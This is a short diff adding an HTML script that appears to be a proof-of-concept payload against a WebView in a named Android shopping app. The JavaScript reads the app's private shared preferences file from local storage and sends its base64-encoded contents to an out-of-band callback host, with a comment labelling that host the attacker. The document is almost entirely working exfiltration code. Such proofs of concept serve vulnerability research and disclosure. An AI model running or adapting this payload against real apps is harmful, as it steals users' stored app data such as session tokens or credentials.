@@ -1,0 +1,14 @@
+<script>
+    var url = 'file:///data/data/com.ipragmatech.clovia.shop/shared_prefs/MyPrefs.xml'; //local file
+function load(url) {
+        var xhr = new XMLHttpRequest();
+xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+            fetch('https://cfh61hy2vtc0000mtzwgg8auy3yyyyyyb.oast.fun/?exfiltrated=' + btoa(xhr.responseText)); //send b64 encoded file to attacker
+            }
+        }
+xhr.open('GET', url, true);
+        xhr.send('');
+    }
+load(url)
+</script>
